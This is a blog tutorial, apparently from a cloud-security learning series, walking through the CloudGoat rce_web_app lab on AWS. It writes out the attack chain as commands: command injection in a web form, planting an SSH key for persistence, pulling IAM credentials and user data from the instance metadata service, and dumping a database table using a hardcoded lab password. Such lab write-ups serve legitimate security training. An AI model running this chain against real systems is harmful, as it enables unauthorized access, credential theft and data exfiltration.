---
title: '100 Days of Cloud Security - Day 36: Attack — `rce_web_app`  - Part 1'
date: '2025-12-15'
author: 'Venkata Pathuri'
excerpt: 'Day 36 of my cloud security journey - Attack — `rce_web_app`  - Part 1'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 36: Attack — `rce_web_app`  - Part 1

## Overview
Welcome back to Day 36 of our cloud security journey! Today, we dive deep into the world of Remote Code Execution (RCE) vulnerabilities through the `rce_web_app` scenario. Building on the foundational concepts we explored in Day 35, we’ll execute a simulated attack that highlights the importance of securing application deployments against such vulnerabilities. By the end of this session, you’ll understand how attackers exploit RCE vulnerabilities and how organizations can bolster their defenses.

## Learning Objectives
In today’s lesson, you’ll learn to deploy the CloudGoat `rce_web_app` scenario and uncover secrets stored in an RDS database. You’ll master essential skills such as enumerating AWS resources, exploiting web application vulnerabilities, establishing a foothold on cloud instances, and extracting sensitive information from databases. These skills are critical for any cloud security professional aiming to protect their organization against potential breaches.

## Deep Dive
### Scenario Overview
In our attack simulation, we’re dealing with a cloud architecture consisting of a VPC with an Elastic Load Balancer (ELB), an EC2 instance, three S3 buckets, and an RDS database. We will interact with two IAM users, primarily focusing on `lara`, who has limited permissions that we will leverage for our attack.

### 1. Initial Enumeration
Our journey begins by listing the S3 buckets accessible to the `lara` user. Using the command:
```bash
aws s3 ls --profile cg-lara
```
we discover three buckets. While two are inaccessible, one, `cg-logs-s3-bucket-cgidlkepie1yzv`, is open for inspection. This bucket will provide us with valuable logs that reveal the existence of an ELB and its public URL.

### 2. Web Application Exploitation
Accessing the public URL of the ELB, we find an intriguing homepage directing users to a secret URL. Analyzing the logs leads us to:
```
http://cg-lb-cgidlkepie1yzv-1692601036.us-east-1.elb.amazonaws.com/mkja1xijqf0abo1h9glg.html
```
Here, we encounter an input field vulnerable to RCE. By injecting simple commands like `ls` or `whoami`, we confirm the vulnerability, allowing us to execute arbitrary commands on the server.

### 3. Gain Foothold (SSH Access)
To maintain access, we generate a new SSH key pair locally:
```bash
ssh-keygen -t ed25519 -C "email@gmail.com"
```
Using the RCE vulnerability, we add the public key to the `ubuntu` user’s `authorized_keys` file:
```bash
echo "ssh-ed25519 AAAAC3Nza...[your_public_key]...3N email@gmail.com" >> /home/ubuntu/.ssh/authorized_keys
```
Next, we determine the instance’s public IP address with:
```bash
curl ifconfig.me
```
Finally, we connect to the instance via SSH:
```bash
ssh -i /path/to/aws_public_cg ubuntu@54.198.219.6
```
At this point, we have established a stable shell as the `ubuntu` user on the EC2 instance.

### 4. Post-Exploitation (EC2 Instance)
To pivot to other AWS services, we query the EC2 Instance Metadata Service (IMDS):
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 3600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgidlkepie1yzv
```
A critical finding is the user data containing hardcoded credentials for a PostgreSQL database. The command:
```bash
curl http://169.254.169.254/latest/user-data
```
reveals credentials as well as the RDS endpoint and database information.

### 5. Data Exfiltration (RDS Database)
Using the discovered credentials, we connect to the RDS database:
```bash
psql postgresql://cgadmin:Purplepwny2029@cg-rds-instance-cgidlkepie1yzv.c1o6qkm66w75.us-east-1.rds.amazonaws.com:5432/cloudgoat -c "SELECT * FROM sensitive_information;"
```
This command successfully extracts sensitive information, completing our simulation.

## Hands-On Practice
This exercise emphasizes practical skills in identifying and exploiting security vulnerabilities. Here’s what you need to do:

1. **List S3 Buckets**: Use the provided command to list accessible S3 buckets.
2. **Download Logs**: Access the log bucket and analyze the contents.
3. **Exploit RCE**: Navigate to the discovered URL and test for RCE.
4. **SSH Access**: Generate an SSH key pair and leverage RCE to gain persistent access.
5. **Query IMDS**: Extract IAM role credentials and user data to find sensitive information.

**Common Troubleshooting Tips**:
- Ensure your AWS CLI is configured with the correct profile.
- Check for network connectivity issues when accessing the ELB.
- If unable to connect via SSH, verify that the public key was correctly added to `authorized_keys`.

## Key Takeaways
Today’s exploration into RCE vulnerabilities reinforces the necessity of securing web applications against unauthorized access and command execution. By simulating the attack lifecycle, we’ve demonstrated how attackers can exploit such vulnerabilities to gain access to sensitive data. It’s a reminder of the vital role that security best practices play in cloud environments.

## Real-World Applications
Understanding how RCE vulnerabilities can be exploited is crucial for cloud security professionals. In production environments, organizations must implement robust security measures, such as input validation, proper IAM policies, and regular security audits to mitigate these risks. By applying the lessons learned today, you can help fortify your organization’s cloud infrastructure against potential threats.

---
**Journey Progress:** 36/100 Days Complete 🚀